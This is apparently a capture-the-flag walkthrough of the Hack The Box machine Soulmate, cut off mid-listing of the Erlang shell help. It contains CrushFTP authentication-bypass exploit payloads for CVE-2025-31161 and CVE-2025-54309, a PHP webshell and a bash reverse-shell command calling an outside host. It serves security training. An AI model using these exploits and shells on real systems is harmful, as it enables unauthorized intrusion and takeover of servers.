---
maquina: "soulmate"
dificultad: "Easy"
os: "Linux"
plataforma: "htb"
release: "06 Sep 2025"
retire: "06 Sep 2025"
creadores: "kavigihan"
htb_url: "https://hackthebox.com/machines/soulmate"
app_url: "https://app.hackthebox.com/machines/721"
url: "https://0xdf.gitlab.io/2026/02/14/htb-soulmate.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Soulmate has a PHP-based dating website, as well as an instance of CrushFTP. I’ll showcase two different authentication bypass CVEs to get admin access to CrushFTP. From there I can upload a PHP webshell and get a foothold on the box. I’ll find hardcoded credentials in an Erlang SSH server, and use them to get to the next user. I’ll also use them to connect to this SSH server and navigate the Erlang console as root to solve the challenge.

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
oxdf@hacky$ sudo nmap -p- -vvv --min-rate 10000 10.129.231.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-12 17:36 UTC
...[snip]...
Nmap scan report for 0xdf.gitlab.htb (10.129.231.23)
Host is up, received reset ttl 63 (0.025s latency).
Scanned at 2026-02-12 17:36:45 UTC for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 7.40 seconds
           Raw packets sent: 71517 (3.147MB) | Rcvd: 65536 (2.621MB)
oxdf@hacky$ sudo nmap -p 22,80 -sCV 10.129.231.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-12 17:37 UTC
Nmap scan report for 0xdf.gitlab.htb (10.129.231.23)
Host is up (1.8s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
```

Based on the [OpenSSH and nginx](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 jammy LTS.

All of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away.

There’s a redirect on 80 to `soulmate.htb`.

### Subdomain Fuzz

Given the use of domain name / host-based routing, I’ll use `ffuf` to scan for any subdomains of `soulmate.htb` that may respond differently:

```console
oxdf@hacky$ ffuf -u http://10.129.231.23 -H "Host: FUZZ.soulmate.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.231.23
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 150ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1851 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

It finds `ftp.soulmate.htb`. I’ll add both to my `hosts` file:

```plaintext
10.129.231.23 soulmate.htb ftp.soulmate.htb
```

### soulmate.htb - TCP 80

#### Site

The website is a dating website:

![image-20260212130623767](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212130623767.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

There’s a lot on the page, but as far as things I’m interested in:

- An email address, `hello@soulmate.htb`.
- Login and Registration links

The login page looks normal. I’ll register an account:

![image-20260212174208072](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212174208072.png)

Submitting redirects to the login page:

![image-20260212174230801](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212174230801.png)

Once logged in, there’s a profile page:

![image-20260212174313184](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212174313184.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

That’s basically all that there is. I’ll play with file uploads but there’s nothing super interesting here. I’m not able to get a PHP file uploaded.

#### Tech Stack

The various pages on the site are all `.php`. The HTTP response headers also show that a `PHPSESSID` cookie is set on visiting any page:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 12 Feb 2026 18:03:31 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=p82v21e5ul1veblbivusc1j2h4; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 16688
```

The 404 page is the [default nginx 404](https://0xdf.gitlab.io/cheatsheets/404#nginx):

![image-20260212174430884](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212174430884.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```console
oxdf@hacky$ feroxbuster -u http://soulmate.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soulmate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      306l     1061w    16688c http://soulmate.htb/
302      GET        0l        0w        0c http://soulmate.htb/logout.php => login.php
301      GET        7l       12w      178c http://soulmate.htb/assets => http://soulmate.htb/assets/
301      GET        7l       12w      178c http://soulmate.htb/assets/images => http://soulmate.htb/assets/images/
301      GET        7l       12w      178c http://soulmate.htb/assets/css => http://soulmate.htb/assets/css/
403      GET        7l       10w      162c http://soulmate.htb/assets/
403      GET        7l       10w      162c http://soulmate.htb/assets/css/
302      GET        0l        0w        0c http://soulmate.htb/profile.php => http://soulmate.htb/login
301      GET        7l       12w      178c http://soulmate.htb/assets/images/profiles => http://soulmate.htb/assets/images/profiles/
200      GET      306l     1061w    16688c http://soulmate.htb/index.php
302      GET        0l        0w        0c http://soulmate.htb/dashboard.php => http://soulmate.htb/login
[####################] - 35s   150007/150007  0s      found:14      errors:0
[####################] - 33s    30000/30000   898/s   http://soulmate.htb/
[####################] - 33s    30000/30000   900/s   http://soulmate.htb/assets/
[####################] - 33s    30000/30000   898/s   http://soulmate.htb/assets/css/
[####################] - 33s    30000/30000   901/s   http://soulmate.htb/assets/images/
[####################] - 34s    30000/30000   889/s   http://soulmate.htb/assets/images/profiles/
```

Nothing I haven’t seen already.

### ftp.soulmate.htb - TCP 80

#### Site

This site is an instance of CrushFTP:

![image-20260212174559904](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212174559904.png)

I can try the creds I created for the other site, but they don’t work:

![image-20260212174624172](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212174624172.png)

#### Tech Stack

The HTTP response headers show different cookies from the main site:

```http
HTTP/1.1 302 Redirect
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 12 Feb 2026 22:44:43 GMT
Content-Length: 0
Connection: keep-alive
Set-Cookie: currentAuth=M66R; path=/
Set-Cookie: CrushAuth=1770936283737_nao4gVOjjFelUqKpsIRCVm8eUxM66R; path=/; HttpOnly
P3P: policyref="/WebInterface/w3c/p3p.xml", CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"
Pragma: no-cache
location: /WebInterface/login.html
```

[CrushFTP](https://www.crushftp.com/index.html) is written in Java, and it’s behind the same nginx reverse proxy.

## Shell as www-data

### CrushFTP Admin Access

#### Vulnerability Identification

Searching for “crushftp cve” turns up a few vulnerabilities:

![image-20260212194737517](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212194737517.png)

CrushFTP had two major CVEs in 2025:

- 3 April - [CVE-2025-31161](https://nvd.nist.gov/vuln/detail/CVE-2025-31161) - Auth bypass to Admin, with a duplicate rejected entry as [CVE-2025-2825](https://nvd.nist.gov/vuln/detail/CVE-2025-2825)
- 5 November - [CVE-2025-54309](https://nvd.nist.gov/vuln/detail/CVE-2025-54309) - Auth bypass to Admin

#### CVE-2025-31161

I’ll grab [this POC](https://github.com/0xgh057r3c0n/CVE-2025-31161/tree/main) from 0xgh057r3c0n:

```console
oxdf@hacky$ git clone https://github.com/0xgh057r3c0n/CVE-2025-31161.git         Cloning into 'CVE-2025-31161'...
remote: Enumerating objects: 32, done.                                                                                remote: Counting objects: 100% (32/32), done.
remote: Compressing objects: 100% (32/32), done.
remote: Total 32 (delta 15), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (32/32), 15.58 KiB | 1.56 MiB/s, done.
Resolving deltas: 100% (15/15), done.
oxdf@hacky$ cd CVE-2025-31161/
```

I’ll need to specify the required libraries to run with `uv` ([cheatsheet](https://0xdf.gitlab.io/cheatsheets/uv#add-meta)), and now it runs:

```console
oxdf@hacky$ uv add --script CVE-2025-31161.py requests colorama
Updated `CVE-2025-31161.py`
oxdf@hacky$ uv run --with requests CVE-2025-31161.py
Installed 6 packages in 8ms
  [-] Target host not specified
usage: CVE-2025-31161.py [-h] [--target_host TARGET_HOST] [--port PORT] [--target_user TARGET_USER]
                         [--new_user NEW_USER] [--password PASSWORD]

Exploit CVE-2025-31161 to create a new account

options:
  -h, --help            show this help message and exit
  --target_host TARGET_HOST
                        Target host
  --port PORT           Target port
  --target_user TARGET_USER
                        Target user
  --new_user NEW_USER   New user to create
  --password PASSWORD   Password for the new user
```

The script makes two requests using some custom headers:

```python
    headers = {
        "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "Connection": "close",
        "User-Agent": random.choice(USER_AGENTS),
    }
```

CrushFTP sees this `Authorization` header and begins an AWS S3-compatible auth flow, extracting the username (crushadmin) from the `Credential` field. The authentication is never actually completed/validated, but the server treats the session as partially authenticated, which is enough to access admin API functions.

First there’s a GET request to `/WebInterface/function/` with the crafted headers. This establishes a session on the server side associated with the fake auth token in the cookies. This may timeout, which is fine.

Next, there’s a POST request to the same URL with a payload with the `command` of “setUserItem”, and an XML section that describes a new user:

```python
    payload = {
        "command": "setUserItem",
        "data_action": "replace",
        "serverGroup": "MainUsers",
        "username": new_user,
        "user": f'<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>{new_user}</user_name><password>{password}</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>{target_user}</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "31If"
    }
```

It’s important that the `c2f` field in the cookie and in the payload match the last four characters of the `CrushAuth` cookie, which tricks the CSRF-like check. When this works, it creates a new user:

```console
oxdf@hacky$ uv run --with requests CVE-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user 0xdf --password 0xdf
_____________   _______________         _______________   ________   .________         ________  ____ ____  ____________
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \  |   ____/         \_____  \/_   /_   |/  _____/_   |
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/  |____  \   ______   _(__  < |   ||   /   __  \ |   |
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/  /       \|   ||   \  |__\  \|   |
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         /______  /|___||___|\_____  /|___|
        \/                  \/                  \/     \/         \/       \/                 \/                 \/

Author: Gaurav Bhattacharjee (G4UR4V007)

CVE-2025-31161 - CrushFTP User Creation Authentication Bypass Exploit
Description:
This vulnerability allows an attacker to create a new user account on CrushFTP
without proper authentication by sending crafted XML payloads to the WebInterface.
This can lead to unauthorized access and potential full compromise of the server.

[+] Preparing Payloads
  [-] Warming up the target...
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully!

[+] Exploit Complete! You can now login with:
   [*] Username: 0xdf
   [*] Password: 0xdf
```

Now I can log in as 0xdf as an admin account.

#### CVE-2025-54309

This CVE is described as:

> CrushFTP 10 before 10.8.5 and 11 before 11.3.4_23, when the DMZ proxy feature is not used, mishandles AS2 validation and consequently allows remote attackers to obtain admin access via HTTPS, as exploited in the wild in July 2025.

I’ll grab [this POC](https://github.com/whisperer1290/CVE-2025-54309__Enhanced_exploit) from whisperer1290 and let it use `requests`:

```console
oxdf@hacky$ git clone https://github.com/whisperer1290/CVE-2025-54309__Enhanced_exploit.git
Cloning into 'CVE-2025-54309__Enhanced_exploit'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 3), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (18/18), 9.66 KiB | 1.61 MiB/s, done.
Resolving deltas: 100% (3/3), done.
oxdf@hacky$ cd CVE-2025-54309__Enhanced_exploit/
oxdf@hacky$ uv run exploit.py
Installed 5 packages in 5ms

╔═══════════════════════════════════════════════════════════╗
║            CrushFTP CVE-2025-54309 Exploit               ║
║         Race Condition Authentication Bypass             ║
║               User Creation Version                       ║
║                                                           ║
║           FOR AUTHORIZED TESTING ONLY                     ║
║              HTB Labs & Pentesting Use                    ║
╚═══════════════════════════════════════════════════════════╝

usage: exploit.py [-h] [-u USERNAME] [-p PASSWORD] [-r REQUESTS] [--verify] target

CrushFTP CVE-2025-54309 User Creation Exploit

positional arguments:
  target                Target CrushFTP URL (e.g., http://ftp.soulmate.htb)

options:
  -h, --help            show this help message and exit
  -u, --username USERNAME
                        Username for new admin user (default: htbadmin)
  -p, --password PASSWORD
                        Password for new admin user (default: HTBPassword123!)
  -r, --requests REQUESTS
                        Number of request pairs (default: 5000)
  --verify              Verify user creation by checking user list
```

This exploit is a race condition in how the AS2-TO header is handled. This script sends two requests in parallel:

1. AS2 request (make_request_with_as2, line 58): Sends a POST with the header `AS2-TO: \crushadmin` and `Content-Type: disposition-notification`. This triggers CrushFTP’s AS2 handler, which temporarily authenticates the session as crushadmin during processing.
2. Regular request (make_request_without_as2, line 111): Sends a user-creation POST sharing the same `CrushAuth` session cookie. If this request is processed before the session is invalidated, it will successfully create a new admin user.

This script by default will try 5000 pairs of requests until it works.

It works:

```console
oxdf@hacky$ uv run --with requests exploit.py -u 0xdfadmin -p 0xdf0xdf --verify http://ftp.soulmate.htb

╔═══════════════════════════════════════════════════════════╗
║            CrushFTP CVE-2025-54309 Exploit               ║
║         Race Condition Authentication Bypass             ║
║               User Creation Version                       ║
║                                                           ║
║           FOR AUTHORIZED TESTING ONLY                     ║
║              HTB Labs & Pentesting Use                    ║
╚═══════════════════════════════════════════════════════════╝

[*] Target: http://ftp.soulmate.htb
[*] New admin user: 0xdfadmin:0xdf0xdf
[*] CRUSHFTP USER CREATION EXPLOIT
[*] TARGET: http://ftp.soulmate.htb
[*] CREATING USER: 0xdfadmin:0xdf0xdf
[*] ATTACK: 5000 requests with new c2f every 50 requests
============================================================
[*] Generated new c2f value: QfRU
[*] Starting race with 5000 request pairs...
============================================================
[*] Generated new c2f value: lxZ7
[*] NEW SESSION: c2f=lxZ7
[+] SUCCESS! User '0xdfadmin' created successfully!
[+] Response indicates user creation was successful
[+] USER CREATION SUCCESSFUL!
[*] Verifying user creation...
[-] VERIFICATION FAILED: User '0xdfadmin' not found in user list

[+] EXPLOITATION COMPLETE!
[+] Admin user created: 0xdfadmin:0xdf0xdf
[+] Try logging in at: http://ftp.soulmate.htb/WebInterface/
[+] Or access the admin interface directly
```

### Webshell Upload

As either account, I can log in with admin access:

![image-20260212201621643](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212201621643.png)

This user doesn’t have any folders mounted for it. I’ll click the “Admin” button, which loads a noisy dashboard:

![image-20260212201710626](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212201710626.png)

There’s a “User Manager” link at the top, which leads to:

![image-20260212201748006](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212201748006.png)

Clicking my user, I can add a folder with “Upload” privileges. A bit of exploration and I’ll find the dating website source in `/app/webProd`, which I’ll drag over:

![image-20260212201917805](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212201917805.png)

On clicking “Save” and going back to “Files”, there’s the `soulmate.htb` site files:

![image-20260212201946907](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212201946907.png)

I’ll create a simple PHP webshell:

```php
<?php system($_REQUEST['cmd']); ?>
```

And upload it:

![image-20260212202048499](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212202048499.png)

It works:

![image-20260212202107762](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260212202107762.png)

I’ll use `curl` to trigger a reverse shell:

```console
oxdf@hacky$ curl http://soulmate.htb/cmd.php?cmd=bash --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.44/443 0>&1"'
```

This just hangs, but at `nc`:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.231.23 34824
bash: cannot set terminal process group (1151): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:~/soulmate.htb/public$
```

I’ll upgrade my shell with the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
www-data@soulmate:/home$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@soulmate:/home$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@soulmate:/home$
```

## Shell as ben

### Enumeration

#### Website

The website code is in `/var/www/soulmate.htb`:

```console
www-data@soulmate:~/soulmate.htb$ ls
config  data  public  src
```

`public` has the PHP files:

```console
www-data@soulmate:~/soulmate.htb$ ls public/
assets         index.php  logout.php   register.php
dashboard.php  login.php  profile.php
```

`data` has a SQLite database:

```console
www-data@soulmate:~/soulmate.htb$ file data/soulmate.db
data/soulmate.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 5
```

It has a single hash:

```console
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO users VALUES(1,'admin','$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2',1,'Administrator',NULL,NULL,NULL,NULL,'2025-08-10 13:00:08','2025-08-10 12:59:39');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',2);
COMMIT;
```

It’s using PHP’s `password_hash` function (in `User.php`), which uses bcrypt. I’ll pass it to `hashcat`, but it doesn’t crack.

#### Users

There’s one user with a home directory in `/home`:

```console
www-data@soulmate:/home$ ls
ben
```

That matches the users with shells set:

```console
www-data@soulmate:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```

#### Erlang SSH

Looking at the process list, there’s an interesting entry:

```console
www-data@soulmate:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 166164 11432 ?        Ss   Feb12   0:05 /sbin/init
...[snip]...
root        1144  0.0  1.6 2252184 67372 ?       Ssl  Feb12   0:29 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
...[snip]...
```

This is some kind of Erlang script. It’s running as root, and owned by root (not writable):

```console
www-data@soulmate:/$ ls -l /usr/local/lib/erlang_login/start.escript
-rwxr-xr-x 1 root root 1427 Aug 15 07:46 /usr/local/lib/erlang_login/start.escript
```

It’s an SSH server:

```erlang
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

I’ll go through the entire script in the next section. For now, I’ll notice a hard-coded password for ben:

```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]},
```

### su / SSH

The password works for ben with `su`:

```console
www-data@soulmate:/$ su - ben
Password:
ben@soulmate:~$
```

It also works for SSH:

```console
oxdf@hacky$ sshpass -p HouseH0ldings998 ssh ben@soulmate.htb
Warning: Permanently added 'soulmate.htb' (ED25519) to the list of known hosts.
Last login: Fri Feb 13 01:50:52 2026 from 10.10.14.44
ben@soulmate:~$
```

I’ll grab `user.txt`:

```console
ben@soulmate:~$ cat user.txt
e74a6139************************
```

## Shell as root

### Enumeration

#### ben

ben cannot run `sudo`:

```console
ben@soulmate:~$ sudo -l
[sudo] password for ben:
Sorry, user ben may not run sudo on soulmate.
```

Their home directory is very empty:

```console
ben@soulmate:~$ ls -la
total 28
drwxr-x--- 3 ben  ben  4096 Sep  2 10:27 .
drwxr-xr-x 3 root root 4096 Sep  2 10:27 ..
lrwxrwxrwx 1 root root    9 Aug 27 09:28 .bash_history -> /dev/null
-rw-r--r-- 1 ben  ben   220 Aug  6  2025 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Aug  6  2025 .bashrc
drwx------ 2 ben  ben  4096 Sep  2 10:27 .cache
-rw-r--r-- 1 ben  ben   807 Aug  6  2025 .profile
-rw-r----- 1 root ben    33 Feb 12 12:52 user.txt
```

#### Erlang SSH Script

I noted above that the Erlang script is running as root. I’ll look more closely at it. It starts the Erlang VM with the name “ssh_runner”:

```erlang
#!/usr/bin/env escript
%%! -sname ssh_runner
```

```erlang
main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),
```

It starts the main entrypoint, where the underscore in `main(_)` says to ignore command line args. It starts the required Erlang applications and then prints a message.

```erlang
    case ssh:daemon(2222, [
...[snip]...
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

It then starts an SSH daemon on port 2222, and prints a message about if it worked. Inside the daemon, it defines several configuration values:

```erlang
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
```

- Listens on localhost.
- The system directory is `/etc/ssh`.
- The user directory is the username in `/home`.
- The hard-coded password.

### Erlang SSH

Given all of this, I can connect as ben:

```console
ben@soulmate:~$ ssh -p 2222 ben@localhost
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
ben@localhost's password:
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

This is not a standard shell. `.` will end the line, and I can call `help()` to get a list of functions:

```console
(ssh_runner@soulmate)1> help().
** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
f(X)       -- forget the binding of variable X
h()        -- history
h(Mod)     -- help about module
h(Mod,Func)-- help about function in module
h(Mod,Func,Arity) -- help about function with arity in module
ht(Mod)    -- help about a module's types
ht(Mod,Type) -- help about type in module
ht(Mod,Type,Arity) -- help about type with arity in module
hcb(Mod)    -- help about a module's callbacks
hcb(Mod,CB) -- help about callback in module
hcb(Mod,CB,Arity) -- help about callback with arity in module
history(N) -- set how many previous commands to keep
results(N) -- set how many previous command results to keep
catch_exception(B) -- how exceptions are handled
v(N)       -- use the value of query <N>
rd(R,D)    -- define a record
rf()       -- remove all record information
rf(R)      -- remove record information about R
rl()       -- display all record information
rl(R)      -- display record information about R
rp(Term)   -- display Term using the shell's record information
rr(File)   -- read record information from File (wildcards allowed)
rr(F,R)    -- read selected record information from file(s)
rr(F,R,O)  -- read selected record information with options
lf()       -- list locally defined functions
lt()       -- list locally defined types
lr()       -- list locally defined records
ff()       -- forget all locally defined functions
ff({F,A})  -- forget locally defined function named as atom F and arity A
tf()       -- forget all locally defined types
tf(T)      -- forget locally defined type named as atom T
fl()       -- forget all locally defined functions, types and records
save_module(FilePath) -- save all locally defined functions, types and records to a file
bt(Pid)    -- stack backtrace for a process
c(Mod)     -- compile and load module or file <Mod>
cd(Dir)    -- change working directory
flush()    -- flush any messages sent to the shell
help()     -- help info
h(M)       -- module documentation
h(M,F)     -- module function documentation
h(M,F,A)   -- module function arity documentation
i()        -- information about the system
ni()       -- information about the networked system
i(X,Y,Z)   -- information about pid <X,Y,Z>
l(Module)  -- load or reload module
lm()       -- load all modified modules
lc([File]) -- compile a list of Erlang modules
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
q()        -- quit - shorthand for init:stop()
regs()     -- information about registered processes
nregs()    -- information about all registered processes
